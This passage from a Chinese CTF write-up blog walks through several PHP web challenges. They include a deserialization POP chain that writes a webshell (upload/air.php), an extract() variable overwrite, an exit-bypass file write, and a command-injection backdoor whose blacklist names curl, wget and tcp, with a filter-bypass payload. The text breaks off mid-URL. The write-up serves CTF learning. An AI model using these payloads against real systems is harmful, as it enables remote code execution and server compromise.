class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="hljs-string">&quot;/index&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;redirect(<span class="hljs-variable">$curr_url</span>,<span class="hljs-number">302</span>);<br>                <span class="hljs-keyword">exit</span>();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>))&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;filename_tmp=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;filename=md5(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;ext_check();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext) &#123;<br>            <span class="hljs-keyword">if</span>(getimagesize(<span class="hljs-keyword">$this</span>-&gt;filename_tmp)) &#123;<br>                @copy(<span class="hljs-keyword">$this</span>-&gt;filename_tmp, <span class="hljs-keyword">$this</span>-&gt;filename);<br>                @unlink(<span class="hljs-keyword">$this</span>-&gt;filename_tmp);<br>                <span class="hljs-keyword">$this</span>-&gt;img=<span class="hljs-string">&quot;../upload/<span class="hljs-subst">$this</span>-&gt;upload_menu/<span class="hljs-subst">$this</span>-&gt;filename&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;update_img();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Forbidden type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Unknow file type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>第二个判断，名字从$_FILE全局变量中取出，并且把后缀加上png，这里其实存在一个漏洞，如果不通过上传文件的接口去调用该方法，那么$FILES变量就为空，那么文件名就可控喽，那在下面就可以通过copy方法去生成文件，进而rce</p><p>那么究竟如何调用upload_img方法呢?一般这种考点就是反序列化了</p><p>先找反序列化入口，在index.php中有一反序列化点，且参数可控</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$profile</span>=cookie(<span class="hljs-string">&#x27;user&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$profile</span>))&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;profile=unserialize(base64_decode(<span class="hljs-variable">$profile</span>));<br>        <span class="hljs-keyword">$this</span>-&gt;profile_db=db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;ID&quot;</span>,intval(<span class="hljs-keyword">$this</span>-&gt;profile[<span class="hljs-string">&#x27;ID&#x27;</span>]))-&gt;find();<br>        <span class="hljs-keyword">if</span>(array_diff(<span class="hljs-keyword">$this</span>-&gt;profile_db,<span class="hljs-keyword">$this</span>-&gt;profile)==<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面回到Profile.php中，一般反序列化就是要找魔术方法，这个profile类里面没有wakeup或者destruct方法，那就得通过其他类去调用他。</p><p>他存在一个call方法，其中两个参数可控，所以就能调用upload_img方法了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面去寻找其他类中的destruct或者wakeup方法，可以看到在regeister类里面有一个destruct方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;registed)&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker-&gt;index();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果把checker赋值为profile类，而profile类中不存在index方法，那么就会调用call方法，而call方法进而get方法再进而调用</p><p>upload_img方法，完成pop链构造</p><p>这里着重讲下__call方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestCall</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$param</span></span>)</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$method</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>      var_dump(<span class="hljs-variable">$param</span>);<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;call the call!&quot;</span>;<br>  &#125;<br>&#125;<br><br><br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> TestCall();<br><br><span class="hljs-variable">$test</span>-&gt;air(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br><br></code></pre></td></tr></table></figure><p>输出结果为</p><p><img src="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010150041995.png"></p><p>可见call方法第一个参数为所调用方法的名称，第二个为传入的参数，，而且以数组的形式储存</p><p>弄清楚这个，就知道__call方法是如何调用 get方法了，首先是传入name，变成了  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;&#123;index&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br></code></pre></td></tr></table></figure><p>先计算花括号里面的值，调用了get方法，取到了我们存在数组里的upload_image方法然后变成了了 upload_image() 最后进行调用</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$registed</span> =<span class="hljs-number">0</span>;<span class="hljs-comment">//目的是过destruct里的if;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span> =<span class="hljs-number">0</span> ;<span class="hljs-comment">//目的是绕过index类的检查，防止退出程序</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>=<span class="hljs-string">&quot;./upload/ea6cf191dc7eec7b0e43199e459204e5/fb5c81ed3a220004b71069645f112867.png&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_menu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;upload/air.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>=<span class="hljs-number">1</span>;<span class="hljs-comment">//目的是过if来调用复制webshell</span><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$img</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;index&quot;</span>=&gt;<span class="hljs-string">&quot;upload_img&quot;</span>);<span class="hljs-comment">//目的是通过__get()魔术方法调用upload_Img函数</span><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Register();<br><span class="hljs-variable">$a</span>-&gt;checker = <span class="hljs-keyword">new</span> Profile();<span class="hljs-comment">//目的是调用POP链</span><br><span class="hljs-variable">$a</span>-&gt;checker-&gt;checker=<span class="hljs-number">0</span>;<span class="hljs-comment">//调用pop链防止退出程序</span><br><br><span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$a</span>));<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSNN</title>
    <link href="/2021/10/07/CNSS/"/>
    <url>/2021/10/07/CNSS/</url>
    
    <content type="html"><![CDATA[<h1 id="我一定要试试-Web-方向"><a href="#我一定要试试-Web-方向" class="headerlink" title="我一定要试试 Web 方向"></a>我一定要试试 Web 方向</h1><p>直接就有flag</p><h1 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h1><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] !==<span class="hljs-string">&#x27;POST&#x27;</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Please Change Your Method!&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;CNSS&quot;</span>]))&#123;<br>        show_source(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;CNSS&quot;</span>] === <span class="hljs-string">&quot;join&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;web&quot;</span>])) &amp;&amp; ((<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;web&quot;</span>]) === <span class="hljs-string">&quot;like&quot;</span>))&#123;<br>            setcookie(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;show_source(<span class="hljs-keyword">__FILE__</span>);&#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            show_source(<span class="hljs-keyword">__FILE__</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/10/07/CNSS/image-20211018114257451.png" alt="hackerbar发包"></p><p>简单的代码审计</p><p><img src="/2021/10/07/CNSS/image-20211018114321991.png" alt="修改cookie"></p><p><a href="https://chrome.google.com/webstore/detail/ginpbkfigcoaokgflihfhhmglmbchinc">https://chrome.google.com/webstore/detail/ginpbkfigcoaokgflihfhhmglmbchinc</a></p><p>hackbar下载地址(需要科学上网)</p><h1 id="D3buger"><a href="#D3buger" class="headerlink" title="D3buger"></a>D3buger</h1><p>进去之后，第一反应是查看源代码 但是发现f12 鼠标右键 crul+u都不好使了，那就是JavaScript限制了我们的使用</p><p><img src="/2021/10/07/CNSS/image-20211018114533890.png" alt="image-20211018114533890"></p><p>以chrome为例，其他浏览器也可以，自己摸索 </p><p>把JavaScript给禁用了，</p><p><img src="/2021/10/07/CNSS/image-20211018115017448.png"></p><p>回来之后发现网页就变空白了，这时候我们ctrl+u 查看源代码</p><p><img src="/2021/10/07/CNSS/image-20211018115051886.png" alt="源代码"></p><p>发现有一个fuck.js 点进去</p><p><img src="/2021/10/07/CNSS/image-20211018115110117.png" alt="flag"></p><p>flag就有了</p><h1 id="👶Baby-GitHacker"><a href="#👶Baby-GitHacker" class="headerlink" title="[👶Baby]GitHacker"></a>[👶Baby]GitHacker</h1><p>用githacker下载源码 直接是搜不到flag的 通过查看日志文件，发现flag被删除了，那就利用git命令恢复到以前的版本去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">git reset -hard HEAD <br><br>git restore index.html<br><br></code></pre></td></tr></table></figure><h1 id="更坑的数学题"><a href="#更坑的数学题" class="headerlink" title="更坑的数学题"></a>更坑的数学题</h1><p><img src="/2021/10/07/CNSS/image-20211018115216170.png"></p><p>题目意思应该是让1s内去提交答案 就能得到flag 下面有一个加时的按钮，通过代码审计，以及抓包的分析，这个按钮是假的</p><p><img src="/2021/10/07/CNSS/image-20211018115345412.png"></p><p>这时候就有两种解法， 第一种是拼手速，1s之内算出来在提交</p><p>第二种就是写脚本去解，下面附上我写的脚本，跑一下就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">from</span> requests.sessions <span class="hljs-keyword">import</span> session<br><br>url=<span class="hljs-string">&#x27;http://81.68.109.40:30005/&#x27;</span><br>session=requests.session()<br>req=session.get(url=url)<br><br>prog = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;\d&#123;8&#125;&#x27;</span>)<br><br>group=prog.findall(req.text)<br><br><span class="hljs-built_in">sum</span>=<span class="hljs-built_in">int</span>(group[<span class="hljs-number">0</span>])*<span class="hljs-built_in">int</span>(group[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">str</span>=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">sum</span>)<br>data=&#123;<br>    <span class="hljs-string">&#x27;res&#x27;</span>:<span class="hljs-built_in">str</span><br>&#125;<br><br>r=session.post(url=url,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br><br></code></pre></td></tr></table></figure><h1 id="😃Easy-Ezp-p"><a href="#😃Easy-Ezp-p" class="headerlink" title="[😃Easy]Ezp#p"></a>[😃Easy]Ezp#p</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    error_reporting(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-variable">$pass</span> = <span class="hljs-string">&#x27;0e0&#x27;</span>;<br>    <span class="hljs-variable">$md55</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>    <span class="hljs-variable">$md55</span> = md5(<span class="hljs-variable">$md55</span>);<br><br>    <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$md55</span>) == <span class="hljs-variable">$pass</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;query&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$before</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;query&#x27;</span>];<br>            <span class="hljs-variable">$med</span> = <span class="hljs-string">&#x27;filter&#x27;</span>;<br>            <span class="hljs-variable">$after</span> = preg_replace(<br>                <span class="hljs-string">&quot;/<span class="hljs-subst">$med</span>/&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$before</span><br>            );<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$after</span> === <span class="hljs-variable">$med</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$verify</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;verify&#x27;</span>];<br>    &#125;<br><br>    extract(<span class="hljs-variable">$_POST</span>);<br>    <br>    <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$verify</span>) === <span class="hljs-variable">$pass</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$$verify</span>;<br>    &#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>存粹就是一个套娃烂活题</p><p>先代码审计，发现前面的if语句需要找一个两次md5加密后开头是0e的，爆破了好多位，没有出，其实前面的代码都没有用，主要在</p><p>extract($_POST);这段代码，可以把$_POST数组里的值全部赋给变量，那就好说了，直接赋值即可，值得注意的是这个题有两段flag，也给了提示，需要传两次参</p><p>payload</p><p><img src="/2021/10/07/CNSS/image-20211018115814800.png" alt="image-20211018115814800"></p><p><img src="/2021/10/07/CNSS/image-20211018115835556.png" alt="image-20211018115835556"></p><h1 id="😃Easy-China-Flag"><a href="#😃Easy-China-Flag" class="headerlink" title="[😃Easy]China Flag"></a>[😃Easy]China Flag</h1><p>这个提示都不是很清楚</p><p><img src="/2021/10/07/CNSS/image-20211020095810238.png" alt="image-20211020095810238"></p><p>只做了第一步，实在是没搞懂出题人第二步想考察的啥</p><p>这个题应该是要考察http响应头的一些知识，但是提示太过模糊，不做也罢，想学习这方面知识可以看下buu上的   假猪套天下第一  这套题，考得比较详细，不整这些烂活</p><h1 id="😮Mid-太极掌门人"><a href="#😮Mid-太极掌门人" class="headerlink" title="[😮Mid]太极掌门人"></a>[😮Mid]太极掌门人</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    error_reporting(<span class="hljs-number">0</span>);<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deleteDir</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br><br>        <span class="hljs-keyword">if</span> (is_dir(<span class="hljs-variable">$path</span>)) &#123;<br>            <span class="hljs-variable">$dirs</span> = scandir(<span class="hljs-variable">$path</span>);<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dirs</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$dir</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$dir</span> != <span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; <span class="hljs-variable">$dir</span> != <span class="hljs-string">&#x27;..&#x27;</span>) &#123;<br>                    <span class="hljs-variable">$sonDir</span> = <span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$dir</span>;<br>                    <span class="hljs-keyword">if</span> (is_dir(<span class="hljs-variable">$sonDir</span>)) &#123;<br><br>                        deleteDir(<span class="hljs-variable">$sonDir</span>);<br><br>                        @rmdir(<span class="hljs-variable">$sonDir</span>);<br><br>                    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$sonDir</span> !== <span class="hljs-string">&#x27;./index.php&#x27;</span><br>                            &amp;&amp; <span class="hljs-variable">$sonDir</span> !== <span class="hljs-string">&#x27;./flag.php&#x27;</span>) &#123;<br><br>                        @unlink(<span class="hljs-variable">$sonDir</span>);<br><br>                    &#125;<br>                &#125;<br>            &#125;<br>            @rmdir(<span class="hljs-variable">$path</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$devil</span> = <span class="hljs-string">&#x27;&lt;?php exit;?&gt;&#x27;</span>;<br><br>    <span class="hljs-variable">$goods</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;goods&#x27;</span>];<br><br>    file_put_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;train&#x27;</span>], <span class="hljs-variable">$devil</span> . <span class="hljs-variable">$goods</span>);<br><br>    sleep(<span class="hljs-number">1</span>);<br><br>    deleteDir(<span class="hljs-string">&#x27;.&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>死亡die(exit)绕过，也算是一个比较经典的题了</p><p>参考下这个链接，讲的比较详细</p><p><a href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a></p><p>其中那个删除目录的方法考察的并非是条件竞争，因为是静态靶机，定时删除shell，防止利用他人的shell</p><h1 id="😮Mid-BlackPage"><a href="#😮Mid-BlackPage" class="headerlink" title="[😮Mid]BlackPage"></a>[😮Mid]BlackPage</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>&lt;!-- \&lt;\?phps<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;(**blacklist**)&quot;</span>;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$blacklist</span>.<span class="hljs-string">&quot;/is&quot;</span>,<span class="hljs-variable">$file</span>) == <span class="hljs-number">1</span>)&#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Nooo,You can&#x27;t read it.&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>&#125;<br><span class="hljs-comment">//你能读到 mybackdoor.php 吗？</span><br></code></pre></td></tr></table></figure><p>查看源码，发现就这样，那就用base64去读源码</p><p><img src="/2021/10/07/CNSS/image-20211020093542185.png" alt="image-20211020093542185"></p><p>读出来以后base64解密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>  <span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;(\\&lt;|\\&gt;|Fl4g|php|curl| |0x|\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\$\\&#123;IFS\\&#125;|index|\\*)&quot;</span>;<br>  <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$filter</span>.<span class="hljs-string">&quot;/is&quot;</span>,<span class="hljs-variable">$cmd</span>)==<span class="hljs-number">1</span>)&#123;  <br>      <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Go out! This black page does not belong to you!&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span>&#123;<br>    system(<span class="hljs-variable">$cmd</span>);<br>  &#125;<br>&#125;<br>blacklist(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>比较简单的命令执行</p><p>payload</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/121.41.7.149:65002/mybackdoor</span>.php?cmd=tac%09/<span 